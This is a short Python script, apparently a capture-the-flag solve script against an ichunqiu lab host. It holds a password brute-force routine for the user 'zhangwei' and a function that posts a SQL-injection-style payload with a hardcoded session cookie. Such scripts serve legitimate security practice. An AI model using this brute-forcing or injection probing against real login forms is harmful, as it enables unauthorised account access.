#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import requests as req
import binascii
import random
import string

# req = requests.Session()

URL = 'http://260923eabd134b828fbdb97f730da6a07be0f5588ad74a0e.game.ichunqiu.com'

HEADER = {
    'Cookie': 'PHPSESSID=5lndo2btl7jkiq5l80a6bfg3u1'
}

# table = string.digits  # + string.ascii_letters


def login(x):
    data = {
        "username": 'zhangwei',
        "password": "zhangwei%03d" % x
    }
    res = req.post(URL + "/login.php", data)
    if res.status_code == 200 and b'username or password error' not in res.content:
        # print(res.content)
        return 1
    else:
        return False


def fuck(pl):
    data = {'content': pl, 'bo_id': '1'}
    res = req.post(URL + "/login.php", data, headers=HEADER)
    if res.status_code == 200:
        print(res.content)
        return 1
    else:
        return False

if __name__ == '__main__':
    # for i in range(1000):
    #     if login(i):
    #         print(i)
    #         break
    # login(1)
    fuck("v,1#")
